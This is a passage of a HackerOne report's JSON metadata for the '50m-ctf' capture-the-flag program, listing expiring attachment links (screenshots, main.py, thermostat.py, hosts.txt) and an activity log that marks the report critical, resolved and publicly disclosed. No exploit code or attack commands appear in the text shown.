pZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0690c76a440b2946c341ddd62e95293db4514a60bf49351334181d99b8c54ee4","file_size":13420,"type":"image/png"},{"id":440494,"file_name":"flite0.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/494/fa311e81b8ed59aa29b8395a57deb5bf8a4bc762/flite0.png?response-content-disposition=attachment%3B%20filename%3D%22flite0.png%22%3B%20filename%2A%3DUTF-8%27%27flite0.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=31cf7a9855afcedc403bbb6e25dbde841b6c66a8841edc2dd530fd1156eef008","file_size":4589,"type":"image/png"},{"id":440498,"file_name":"main.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/498/351c8b3a1e6009427e3a25f603383d2dc7b53f22/main.py?response-content-disposition=attachment%3B%20filename%3D%22main.py%22%3B%20filename%2A%3DUTF-8%27%27main.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=488d83a0ca312d4e814ccdbe4b936772e35d819876ea17c773abc4282a99743d","file_size":3390,"type":"text/plain"},{"id":440500,"file_name":"thermostat.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/500/b7872a49e33d9944a8c7d2f76ed851834728e9a9/thermostat.py?response-content-disposition=attachment%3B%20filename%3D%22thermostat.py%22%3B%20filename%2A%3DUTF-8%27%27thermostat.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1c558716807d431485f70ef976243bf762c92a997ea7a5337735dde65c08f72e","file_size":2784,"type":"text/x-python"},{"id":440501,"file_name":"hosts.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/501/abd1276a72e20598c3fd0a3349f3458188d1fe30/hosts.txt?response-content-disposition=attachment%3B%20filename%3D%22hosts.txt%22%3B%20filename%2A%3DUTF-8%27%27hosts.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6ede0aaefd71bf544404fd65044c3f6eacf94710221eb49f212d1b3d6097e8ff","file_size":2267,"type":"text/plain"}],"allow_singular_disclosure_at":"2019-05-08T15:56:14.636Z","allow_singular_disclosure_after":-76633907.52727194,"singular_disclosure_allowed":true,"vote_count":19,"voters":["zzero","checkm50","mashoud1122","stealthy","ali","amad3u6","01alsanosi","weedman3000","a_p","akshay__brijpuria","and 9 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4313307,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-03-13T06:03:51.014Z","updated_at":"2019-03-13T06:03:51.014Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":315501},"actor":{"username":"stong","cleared":false,"url":"/stong","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/308/492/483bbf842beb55bc2377d05e2085b606b3266dd4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492843,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:33:46.526Z","updated_at":"2019-04-05T18:33:46.526Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stong","url":"/stong"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509097,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:56:14.586Z","updated_at":"2019-04-08T15:56:14.586Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509098,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:56:21.862Z","updated_at":"2019-04-08T15:56:21.862Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}